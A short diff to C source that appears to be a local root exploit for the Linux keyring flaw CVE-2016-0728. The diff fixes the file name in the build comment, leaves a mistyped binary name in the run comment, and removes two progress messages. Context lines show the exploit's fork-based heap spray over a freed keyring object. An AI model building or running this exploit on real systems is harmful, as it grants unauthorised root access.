@@ -1,5 +1,5 @@
-/* $ gcc cve_2016_0726.c -o cve_2016_0726 -lkeyutils -Wall */
-/* $ ./cve_2016_0726 PP_KEY */
+/* $ gcc cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall */
+/* $ ./cve_2016_072 PP_KEY */
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -120,7 +120,6 @@ struct { long mtype;
 
 
     /* allocate msg struct in the kernel rewriting the freed keyring object */
-    printf("forking...\n");
     for (i=0; i<64; i++) {
         pid = fork();
         if (pid == -1) {
@@ -146,7 +145,6 @@ struct { long mtype;
     }
    
 
-    printf("finished forking...\n");
     sleep(5);
 
     /* call userspace_revoke from kernel */
